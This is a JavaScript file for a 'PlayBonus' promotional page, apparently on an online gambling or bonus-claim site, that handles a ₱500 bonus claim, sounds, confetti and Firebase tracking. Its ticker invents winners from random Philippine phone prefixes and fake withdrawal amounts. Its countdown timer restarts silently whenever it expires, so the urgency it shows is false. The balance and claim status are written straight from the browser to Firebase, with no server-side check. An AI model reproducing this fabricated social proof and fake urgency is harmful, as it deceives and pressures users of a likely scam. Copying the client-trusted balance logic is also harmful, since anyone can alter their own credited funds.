/**
 * PlayBonus.js - Main Script for PlayBonus.html
 * Handles: User data, Timer, Ticker, Confetti, PT Cat Claim, Firebase Tracking
 */

(function() {
    'use strict';
    
    // ========== GLOBAL VARIABLES ==========
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    
    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };
    
    // ========== FORMAT NUMBER ==========
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }
    
    // ========== INIT SOUNDS ==========
    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {
            console.log('Sound initialization failed:', e);
        }
    }
    
    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) { 
                console.log('Sound error:', e); 
            });
        }
    }
    
    // ========== INIT ==========
    function init() {
        console.log('🎁 PlayBonus System Starting...');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }
        
        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            var formatted = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
            phoneDisplay.innerText = formatted;
        }
        
        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initPTCCatClaim();
        initConfetti();
        
        // Initialize other modules
        if (window.ChatWidget) window.ChatWidget.init();
        
        console.log('✅ All systems ready!');
    }
    
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
        } catch(e) { 
            console.error('Firebase error:', e); 
        }
    }
    
    // ========== LOAD USER DATA ==========
    function loadUserData() {
        if (!userRef) return;
        
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            if (data) {
                currentBalance = data.balance || 0;
                isClaimed = data.claimed_ptcat || false;
                updateBalanceDisplay();
                updatePTCCatUI();
            } else {
                currentBalance = 0;
                isClaimed = false;
                userRef.set({ 
                    phone: userPhone, 
                    balance: 0, 
                    claimed_ptcat: false, 
                    status: "active", 
                    created_at: Date.now() 
                });
                updateBalanceDisplay();
                updatePTCCatUI();
            }
        }).catch(function(e) { 
            console.error('Load user error:', e); 
        });
        
        // Real-time balance listener
        userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                updateBalanceDisplay();
            }
        });
        
        // Real-time claim status listener
        userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            if (claimed === true && !isClaimed) {
                isClaimed = true;
                updatePTCCatUI();
            }
        });
    }
    
    // ========== UPDATE BALANCE DISPLAY ==========
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
    }
    
    // ========== ADD TO BALANCE ==========
    function addToBalance(amount, slowAnimation) {
        var oldBalance = currentBalance;
        var newBalance = oldBalance + amount;
        
        if (slowAnimation) {
            animateBalanceSlow(oldBalance, newBalance, 2000, function() {
                currentBalance = newBalance;
                if (userRef) {
                    userRef.update({ 
                        balance: currentBalance, 
                        lastUpdate: Date.now() 
                    });
                }
                updateBalanceDisplay();
            });
        } else {
            currentBalance = newBalance;
            updateBalanceDisplay();
            if (userRef) {
                userRef.update({ 
                    balance: currentBalance, 
                    lastUpdate: Date.now() 
                });
            }
        }
        
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.style.transform = 'scale(1.1)';
            setTimeout(function() { 
                if (balanceEl) balanceEl.style.transform = 'scale(1)'; 
            }, 200);
        }
    }
    
    function animateBalanceSlow(start, end, duration, callback) {
        var startTimestamp = null;
        function step(timestamp) {
            if (!startTimestamp) startTimestamp = timestamp;
            var progress = Math.min((timestamp - startTimestamp) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (end - start) + start);
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.innerText = formatNumberWithComma(val);
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }
        requestAnimationFrame(step);
    }
    
    // ========== TRACK CLAIM IN FIREBASE ==========
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = {
                        claims_count: 0,
                        claims_amount: 0,
                        redemption_count: 0,
                        redemption_amount: 0
                    };
                }
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 Claim tracked:', dateKey, '₱' + amount);
        } catch(e) {
            console.error('Track claim error:', e);
        }
    }
    
    // ========== TRACK REDEMPTION IN FIREBASE ==========
    function trackRedemptionInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = {
                        claims_count: 0,
                        claims_amount: 0,
                        redemption_count: 0,
                        redemption_amount: 0
                    };
                }
                data.redemption_count = (data.redemption_count || 0) + 1;
                data.redemption_amount = (data.redemption_amount || 0) + (amount || 0);
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 Redemption tracked:', dateKey, '₱' + amount);
        } catch(e) {
            console.error('Track redemption error:', e);
        }
    }
    
    // ========== PT CAT CLAIM ==========
    function initPTCCatClaim() {
        var claimBtn = document.getElementById('ptCatClaimBtn');
        
        if (!claimBtn) {
            console.log('⚠️ PT Cat claim button not found');
            return;
        }
        
        claimBtn.addEventListener('click', handlePTCCatClaim);
        updatePTCCatUI();
        
        console.log('✅ PT Cat Claim initialized');
    }
    
    function handlePTCCatClaim(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🖱️ PT Cat claim clicked, isClaimed:', isClaimed);
        
        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        
        if (claimInProgress) {
            alert("Please wait, processing your claim...");
            return;
        }
        
        if (!userRef) {
            alert("System not ready. Please refresh the page.");
            return;
        }
        
        // Double-check from Firebase
        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updatePTCCatUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processPTCCatClaim();
        }).catch(function(error) {
            console.error('Error checking claim status:', error);
            processPTCCatClaim();
        });
    }
    
    async function processPTCCatClaim() {
        claimInProgress = true;
        
        var claimBtn = document.getElementById('ptCatClaimBtn');
        
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.6';
            claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        try {
            // Save claim to Firebase
            await userRef.update({ 
                claimed_ptcat: true, 
                ptcat_claimed_at: Date.now() 
            });
            console.log('✅ PT Cat claimed saved to Firebase');
            
            // Track claim in daily stats
            trackClaimInFirebase(bonusAmount);
            
            // Play sound + add balance
            playSound('claim');
            addToBalance(bonusAmount, true);
            
            // Confetti
            startConfetti();
            
            // Update UI
            isClaimed = true;
            updatePTCCatUI();
            
            // Show success popup
            showSuccessPopup(bonusAmount);
            
            setTimeout(function() { 
                claimInProgress = false; 
            }, 2500);
            
        } catch(e) {
            console.error('Firebase save error:', e);
            alert('Error saving claim. Please try again.');
            
            if (claimBtn) {
                claimBtn.disabled = false;
                claimBtn.style.opacity = '1';
                claimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            }
            claimInProgress = false;
        }
    }
    
    function updatePTCCatUI() {
        var claimBtn = document.getElementById('ptCatClaimBtn');
        
        if (claimBtn) {
            if (isClaimed) {
                claimBtn.disabled = true;
                claimBtn.style.opacity = '0.5';
                claimBtn.style.cursor = 'not-allowed';
                claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
                claimBtn.classList.add('claimed');
            } else {
                claimBtn.disabled = false;
                claimBtn.style.opacity = '1';
                claimBtn.style.cursor = 'pointer';
                claimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
                claimBtn.classList.remove('claimed');
            }
        }
    }
    
    // ========== SUCCESS POPUP ==========
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        // Auto close after 5 seconds
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }
    
    // ========== TIMER ==========
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        var timerInterval = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }
            
            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                displayElement.innerHTML = days + 'D ' + 
                    hours.toString().padStart(2, '0') + ':' + 
                    minutes.toString().padStart(2, '0') + ':' + 
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            timerInterval = setInterval(update, 1000);
            
        } catch(e) {
            console.error('Timer error:', e);
        }
    }
    
    // ========== TICKER ==========
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        
        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                totalWeight += amountRarity[i].weight;
            }
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) {
                    return amountRarity[i].amount;
                }
            }
            return 500;
        }
        
        function generateWinner() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            return { prefix: prefix, last4: last4, amount: amount };
        }
        
        function updateTicker() {
            var winner = generateWinner();
            winnerSpan.innerHTML = winner.prefix + '***' + winner.last4 + 
                ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + 
                winner.amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 4800);
    }
    
    // ========== CONFETTI ==========
    function initConfetti() {
        window.confettiCanvas = document.getElementById('confettiCanvas');
    }
    
    function startConfetti() {
        var canvas = window.confettiCanvas;
        if (!canvas) return;
        
        canvas.style.display = 'block';
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        var ctx = canvas.getContext('2d');
        var particles = [];
        var animation = null;
        var timeout = null;
        
        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height - canvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }
        
        function draw() {
            if (!canvas || canvas.style.display === 'none') return;
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();
                
                p.y += p.speed;
                p.rotation += p.rotationSpeed;
                
                if (p.y > canvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * canvas.width;
                }
            }
            animation = requestAnimationFrame(draw);
        }
        
        draw();
        
        timeout = setTimeout(function() {
            if (animation) cancelAnimationFrame(animation);
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            canvas.style.display = 'none';
        }, 4000);
    }
    
    // ========== EXPORT FUNCTIONS ==========
    window.PlayBonus = {
        addToBalance: addToBalance,
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        trackClaim: trackClaimInFirebase,
        trackRedemption: trackRedemptionInFirebase
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
